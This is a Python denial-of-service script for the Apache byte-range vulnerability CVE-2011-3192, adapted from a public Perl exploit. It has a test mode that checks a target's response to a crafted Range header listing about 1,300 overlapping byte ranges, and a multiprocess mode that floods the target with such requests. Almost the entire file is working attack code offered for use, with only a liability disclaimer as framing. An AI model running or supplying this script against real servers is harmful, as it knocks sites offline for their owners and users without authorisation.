#!/usr/bin/env python

"""
Adapted from Perl posted on FullDisclosure by Kingcope.
This code is intended for vulnerability testing. You use this at your own risk and by doing so accept all liabilities therein.
The author can in no way be held liable for your actions.

__author__ = "David Busby"
__copyright__ = "David Busby Saiweb.co.uk && Psycle Interactive Ltd"
__license__ = "GNU v3"
"""

import os
import sys
import multiprocessing
import getopt
from urllib.parse import urlsplit
import http.client
import re

def usage():
    print(f"Usage: {sys.argv[0]} -h http://victimsite.tld/uri/to/test -n <n threads> [-t]")
    print("Note: This only works for static files, not for PHP served URIs.")

def dos(host, uri='/', port=8080, timeout=2):  # Defaulting URI to root
    try:
        c = http.client.HTTPConnection(host, port, timeout)
        r = "5"
        for i in range(0, 1300):
            r = f"{r},5-{i}"

        headers = {
            'Host': host,
            'User-Agent': 'CVE-2011-3192',
            'Range': f"bytes=0-{r}",
            'Accept-Encoding': 'gzip'
        }
        
        c.request('GET', uri, '', headers)
        response = c.getresponse()
        
        if response.status == 404:
            print(f"Error: Resource not found at {host}{uri}")
            return
            
        rHeaders = response.getheaders()
        for header in rHeaders:
            if re.search('.*Partial|Content-Range.*', header[0], re.I):
                print('Host is vulnerable')
                return
            
        print(f"Response status: {response.status}")  # Log the response status
        
    except ConnectionRefusedError:
        print(f"Error: Connection refused for {host}:{port}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    try:
        opts, _ = getopt.getopt(sys.argv[1:], 'h:n:t', [])
    except getopt.GetoptError as e:
        sys.stderr.write(str(e))
        usage()
        sys.exit(1)

    threads = 0
    host = ''
    test = False
    uri = ''
    for o, a in opts:
        if o == '--help':
            usage()
            sys.exit()
        elif o == '-h':
            uri = urlsplit(a)
            host = uri.hostname
        elif o == '-t':
            test = True
        elif o == '-n':
            threads = int(a)

    if not host or not uri.path:
        print("Host and URI must be specified.")
        usage()
        sys.exit(1)

    if test:
        print('Running TEST')
        dos(host, uri.path)
    elif not test and threads > 0:
        p = multiprocessing.Pool(processes=threads)
        p.map(dos, [host for _ in range(threads * 100)])
        print('DoS complete; if the host is still alive, it may not be vulnerable.')

if __name__ == '__main__':
    main()
